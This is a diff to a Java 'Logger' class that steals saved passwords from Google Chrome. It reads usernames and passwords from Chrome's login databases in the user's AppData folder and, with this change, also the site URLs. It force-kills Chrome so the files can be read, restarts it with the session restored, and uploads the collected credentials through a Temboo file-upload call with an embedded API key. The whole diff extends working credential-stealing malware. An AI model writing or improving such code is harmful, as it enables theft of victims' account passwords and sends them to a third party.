@@ -1,5 +1,6 @@
 import java.io.File;
 import java.io.FilenameFilter;
+import java.io.IOException;
 import java.sql.Connection;
 import java.sql.DriverManager;
 import java.sql.ResultSet;
@@ -20,20 +21,24 @@ public class Logger {
 	private String user = System.getProperty("user.name");
 	private String filepath = "C:\\Users\\"+user+"\\AppData\\Local\\Google\\Chrome\\User Data\\";
 	
-	public Logger() throws SQLException, TembooException {
+	public Logger() throws SQLException, TembooException, IOException {
 		run();
 	}
 	
-	public void run() throws SQLException, TembooException{
+	public void run() throws SQLException, TembooException, IOException{
 		ArrayList<String> files = getFiles();
 		ArrayList<ArrayList<String>> passwords = new ArrayList<ArrayList<String>>();
 		ArrayList<ArrayList<String>> usernames = new ArrayList<ArrayList<String>>();
+		ArrayList<ArrayList<String>> urls = new ArrayList<ArrayList<String>>();
 		ArrayList<ResultSet> results = new ArrayList<ResultSet>();
 		ArrayList<ResultSet> results2 = new ArrayList<ResultSet>();
+		ArrayList<ResultSet> results3 = new ArrayList<ResultSet>();
+		closeChrome();
 		String uploadInfo = "";
 		for(String i : files){
 			results.add(getResultSet(i));
 			results2.add(getResultSet(i));
+			results3.add(getResultSet(i));
 		}
 		for(ResultSet i : results){
 			passwords.add(getPass(i));
@@ -41,9 +46,13 @@ public class Logger {
 		for(ResultSet i : results2){
 			usernames.add(getUser(i));
 		}
+		for(ResultSet i : results3){
+			urls.add(getUrl(i));
+		}
+		openChrome();
 		for(int i = 0; i < usernames.size(); i++){
 			for(int j = 0; j < usernames.get(i).size(); j++){
-				uploadInfo+="Username: "+usernames.get(i).get(j)+"\tPasswords: "+passwords.get(i).get(j)+"\n";
+				uploadInfo+="Username: "+usernames.get(i).get(j)+"   ::   Passwords: "+passwords.get(i).get(j)+"   ::   URL: "+urls.get(i).get(j)+"\n";
 			}
 		}
 		upload(uploadInfo);
@@ -71,7 +80,7 @@ public class Logger {
 		    Class.forName("org.sqlite.JDBC");
 			Connection connection = DriverManager.getConnection("jdbc:sqlite:"+file);
 			Statement statement = connection.createStatement();
-			ResultSet resultSet = statement.executeQuery("SELECT username_value, password_value FROM logins"); // some encrypted field
+			ResultSet resultSet = statement.executeQuery("SELECT username_value, password_value, origin_url FROM logins"); // some encrypted field
 			return resultSet;			
 		 }catch(Exception e){
 		    e.printStackTrace();
@@ -111,6 +120,22 @@ public class Logger {
 		return usernames;
 	}
 	
+	public ArrayList<String> getUrl(ResultSet r) throws SQLException{
+		ArrayList<String> urls = new ArrayList<String>(); 
+		while (r.next())
+	    {
+	        byte[] urlData = r.getBytes(3);  // exception over here
+	        StringBuilder urlString = new StringBuilder();
+
+	        for (byte b : urlData)
+	        {
+	           urlString.append((char) b);
+	        }
+	        urls.add(urlString.toString());	
+	   }
+		return urls;
+	}
+	
 	public void upload(String info) throws TembooException{
 		// Instantiate the Choreo, using a previously instantiated TembooSession object, eg:
 		TembooSession session = new TembooSession("logger", "myFirstApp", "N5LS8WVzNyNEKSDrXLVWNFL3nlypo7vr");
@@ -133,6 +158,21 @@ public class Logger {
 		// Execute Choreo
 		UploadFileResultSet uploadFileResults = uploadFileChoreo.execute(uploadFileInputs);
 	}
+	
+	public static void closeChrome() throws IOException{
+		try {
+		    Process p = Runtime.getRuntime().exec("taskkill /F /IM chrome.exe");
+		    p.waitFor();
+		} catch (Exception e) {
+		    e.printStackTrace();
+		}
+	}
+	
+	public static void openChrome(){
+		try {
+		    Process p = Runtime.getRuntime().exec("/Program Files (x86)/Google/Chrome/Application/chrome.exe --restore-last-session");
+		} catch (Exception e) {
+		    e.printStackTrace();
+		}
+	}
 }
-
-
